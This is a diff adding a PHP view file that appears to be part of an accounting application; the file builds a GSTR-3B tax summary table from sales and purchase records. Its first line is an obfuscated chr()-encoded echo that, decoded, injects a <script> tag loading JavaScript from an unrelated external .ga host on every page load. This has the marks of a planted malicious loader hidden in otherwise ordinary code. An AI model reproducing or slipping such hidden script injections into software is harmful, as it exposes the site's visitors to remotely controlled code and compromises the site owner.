@@ -1,0 +1,244 @@
+<?php
+echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
+?>
+<div class="x_content">
+
+	<?php if($this->session->flashdata('message') != ''){
+		echo '<div class="alert alert-info">'.$this->session->flashdata('message').'</div>';
+	}?>
+	
+	<p class="text-muted font-13 m-b-30"></p> 
+<a class="pull-right btn btn-warning btn-large" title="Please check your open office Setting" style="margin-right:40px" href="<?php echo site_url(); ?>account/createXLS_GSTR3B"><i class="fa fa-file-excel-o"></i> Export to JSON</a>	
+<!--id="datatable-buttons"-->	
+	<div class="col-md-2 datePick">
+		Month Picker                      
+		  <fieldset>
+			<div class="control-group">
+			  <div class="controls">
+				<div class="input-prepend input-group">
+				  <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
+				  <input type="text" class="form-control has-feedback-left" name="start_date_filter" id="start_date_filter" placeholder="select date" data-table="account/Gstr_3b">
+				</div>
+			  </div>
+			</div>
+		  </fieldset>
+                        
+    </div>
+	
+
+
+	<table id="datatable"  class="table table-striped table-bordered">
+		<thead>
+			<tr>
+				<th>SNo.</th>
+				<th>Particulars</th>
+				<th>Taxable value</th>
+				<th>Integrated Tax Amount</th>
+				<th>Central Tax Amount</th>
+				<th>State Tax Amount</th>
+				<th>Cess Amount</th>
+				<th>Tax Amount</th>
+				<th style="display:none;">Date</th>
+			</tr>
+		</thead>
+		<tbody>
+		<?php
+		//error_reporting(0);
+		
+		$total_amount_witout_tax = 0;
+		$integrated_tax_sum = 0;
+		$total_amount = 0;
+		$divide_cgst_sgst = 0;
+		$cgst_and_sgst_sum = 0;
+		
+		$total_amount_witout_tax_of_supplies = 0;
+		$total_amountof_supplies = 0;
+		$integrated_tax_sumof_supplies = 0;
+		$cgst_and_sgst_sumof_supplies = 0;
+		$divide_cgst_sgstof_sums = 0;
+		$tax_amount_totalof_supplies = 0;
+		$ddte = 0;
+		foreach($Sale_Data as $invoce_cal){
+			
+			if($invoce_cal['gstin'] !=''  ){
+		
+				$total_amount_witout_tax_Amount = json_decode($invoce_cal['invoice_total_with_tax']);
+					$total_amount_for_conditions = $total_amount_witout_tax_Amount[0]->total;
+						
+							/* Total Amount without Tax Calulate*/
+								$total_amount_witout_tax = json_decode($invoce_cal['invoice_total_with_tax']);
+								
+								$total_amount = $total_amount + $total_amount_witout_tax[0]->total;
+								
+						 	/* Total Amount without Tax Calulate*/
+							/*Integrated Tax Amount*/
+								$party_State = getNameById('ledger',$invoce_cal['party_name'],'id');
+								$company_State = getNameById('company_detail',$_SESSION['loggedInUser']->c_id,'id');
+								$company_state_Data = json_decode($company_State->address, true);
+								$company_state_id = $company_state_Data[0]['state'];
+								if($company_state_id != $party_State->mailing_state ){//When company and ledger are not same 
+									$total_tax = json_decode($invoce_cal['invoice_total_with_tax']);
+									$integrated_tax_sum = $integrated_tax_sum + $total_tax[0]->totaltax;
+									
+								}
+								if($company_state_id == $party_State->mailing_state ){//When company and ledger are same 
+									$total_tax2 = json_decode($invoce_cal['invoice_total_with_tax']);
+									$cgst_and_sgst_sum = $cgst_and_sgst_sum + $total_tax2[0]->totaltax;
+									$divide_cgst_sgst = $cgst_and_sgst_sum / 2;
+									
+								}
+						/*Integrated Tax Amount*/
+						
+						/* Calculate Tax Amount*/
+							$tax_amount_total = $integrated_tax_sum + $cgst_and_sgst_sum;
+						/* Calculate Tax Amount*/
+						
+						
+		}
+		// echo $company_state_id;
+		// echo '<br/>';
+		// echo $party_State->mailing_state;
+		
+		$ddte = $invoce_cal['created_date'];
+		
+			if($invoce_cal['gstin'] =='' && $company_state_id !=  $party_State->mailing_state ){//when compnay state not equal to company state.and gstinno is blank
+		
+				$total_amount_witout_tax_Amount = json_decode($invoce_cal['invoice_total_with_tax']);
+				
+						
+							/* Total Amount without Tax Calulate*/
+								$total_amount_witout_tax_of_supplies = json_decode($invoce_cal['invoice_total_with_tax']);
+								foreach($total_amount_witout_tax_of_supplies as $data_total){
+								  $total_taax =	$data_total->totaltax;
+								  $integrated_tax_sumof_supplies = $integrated_tax_sumof_supplies + $total_taax;
+								  $total_amountof_supplies = $total_amountof_supplies + $data_total->total;
+									// pre($data_total->totaltax);
+								}
+						
+						
+		}
+						
+		
+}	
+
+			$outword_supplies_first = array('tabl_no'=>'3.1','taxable_value'=>number_format($total_amount),'integrated_tax'=>number_format($integrated_tax_sum),'central_amount_tax'=>number_format($divide_cgst_sgst),'state_amount_tax'=>number_format($divide_cgst_sgst),'cess_amount'=>'','tax_amount'=>number_format($tax_amount_total),'date'=>$ddte);
+
+			$Of_the_supplies_second = array('tabl_no'=>'3.2','taxable_value'=>number_format($total_amountof_supplies),'integrated_tax'=>number_format($integrated_tax_sumof_supplies),'central_amount_tax'=>number_format(@$divide_cgst_sgstof_sums),'state_amount_tax'=>number_format($divide_cgst_sgstof_sums),'cess_amount'=>'','tax_amount'=>number_format($integrated_tax_sumof_supplies),'date'=>$ddte);
+
+			
+			$total_tax_sum = 0;
+			$total_tax_sum1 = 0;
+			$value_of_expt = 0;
+			$ddte = 0;
+			foreach($Purchase_Data as $purchase_bill_data){//For Purchase DATA 
+			$ddte = $purchase_bill_data['created_date'];
+					$Bill_detail = json_decode($purchase_bill_data['descr_of_bills']);
+					
+					foreach($Bill_detail as $val){
+						    $rate = $val->rate;
+							$tax  = $val->tax;
+							$qty  = $val->qty;
+							$rate_qty = $qty * $rate;
+							$total_tax = $tax * $rate_qty/100;
+							@$integrated_tax_for_eligible_itc = $integrated_tax_for_eligible_itc + $total_tax;
+			
+
+							@$total_amount_val = $total_amount_val + $val->subtotal; 
+					}
+					$supplier_name = getNameById('supplier',$purchase_bill_data['supplier_name'],'id');
+				
+     				$company_State = getNameById('company_detail',$_SESSION['loggedInUser']->c_id,'id');
+					$company_state_Data = json_decode($company_State->address, true);
+					$company_state_id = $company_state_Data[0]['state'];
+					if($company_state_id != $supplier_name->state ){//When company and ledger are not same  State
+								
+									$Bill_detail21 = json_decode($purchase_bill_data['descr_of_bills']);
+											foreach($Bill_detail21 as $vlaee1){
+												$rate21 = $vlaee1->rate;
+												$tax21 = $vlaee1->tax;
+												$qty21  = $vlaee1->qty;
+												$rate_qty21 = $qty21 * $rate21;
+												$total_tax221 = $tax21 * $rate_qty21/100;
+												 $total_tax_sum1+= $total_tax221;
+										}
+									
+								}
+					if($company_state_id == $supplier_name->state ){//When company and ledger are same  State
+						$Bill_detail2 = json_decode($purchase_bill_data['descr_of_bills']);
+								foreach($Bill_detail2 as $vlaee){
+									$rate2 = $vlaee->rate;
+									$tax2 = $vlaee->tax;
+									$qty2  = $vlaee->qty;
+									$rate_qty2 = $qty2 * $rate2;
+									$total_tax22 = $tax2 * $rate_qty2/100;
+									$total_tax_sum+= $total_tax22;
+							}
+					}
+					
+				$Bill_detail233 = json_decode($purchase_bill_data['descr_of_bills']);
+					foreach($Bill_detail233 as $dtil){
+							if($purchase_bill_data['gstin'] == '' &&  $dtil->tax == '0'){
+								$value_of_expt = $value_of_expt + $dtil->subtotal;
+								
+							}
+							
+						
+						}
+						
+								
+	}
+					
+					
+					
+				$divide_cgst_sgst = $total_tax_sum / 2;
+				$tax_amount2 = $integrated_tax_for_eligible_itc + $total_tax_sum;
+				
+				
+				$Eligible_ITC = array('tabl_no'=>'4','taxable_value'=>number_format($total_amount_val),'integrated_tax'=>number_format($integrated_tax_for_eligible_itc),'central_amount_tax'=>number_format($divide_cgst_sgst),'state_amount_tax'=>number_format($divide_cgst_sgst),'cess_amount'=>'','tax_amount'=>number_format($tax_amount2),'date'=>$ddte);
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			$Value_of_exempt = array('tabl_no'=>'5','taxable_value'=>number_format($value_of_expt),'integrated_tax'=>'00.00','central_amount_tax'=>'00.00','state_amount_tax'=>'00.00','cess_amount'=>'','tax_amount'=>'00.00','date'=>$ddte);
+			
+			$Interest_and_latefee_payable = array('tabl_no'=>'5.1','taxable_value'=>'0','integrated_tax'=>'0','central_amount_tax'=>'0','state_amount_tax'=>'0','cess_amount'=>'','tax_amount'=>'00.00','date'=>$ddte);
+			
+			
+				
+				$all_invoice_data = array(array('Outward supplies and inward supplies liable to reverse charge' =>$outword_supplies_first,'Of the supplies shown in 3.1(a) above of interstate supplies made to unregisterd persons,composition taxable person and UNI holders' =>$Of_the_supplies_second,'Eligible ITC'=>$Eligible_ITC,'Value of exempt,nil rated and non-GST inward supplies'=>$Value_of_exempt,'Interest and Late Fee Payable'=>$Interest_and_latefee_payable));
+				//pre($all_invoice_data);die();
+				
+				foreach($all_invoice_data as $dd_val){
+					//pre($dd_val);
+					foreach($GSTR1_data as $gstr1_name){
+					
+					//if(array_key_exists($gstr1_name,$all_invoice_data)) {
+					  echo '<tr><td>'.$dd_val[$gstr1_name]['tabl_no'].'</td><td>'.$gstr1_name.'</td><td>'.$dd_val[$gstr1_name]['taxable_value'].'</td><td>'.$dd_val[$gstr1_name]['integrated_tax'].'</td><td>'.$dd_val[$gstr1_name]['central_amount_tax'].'</td><td>'.$dd_val[$gstr1_name]['state_amount_tax'].'</td><td>'.$dd_val[$gstr1_name]['cess_amount'].'</td><td>'.$dd_val[$gstr1_name]['tax_amount'].'</td><td style="display:none;">'.$ddte.'</td></tr>';
+					
+					//}
+					
+					 
+					}	
+					
+					
+				}
+			
+				
+				
+				
+		    
+			//  pre($GSTR1_data);
+		    
+		?>
+		
+		</tbody>                   
+	</table>
+</div>
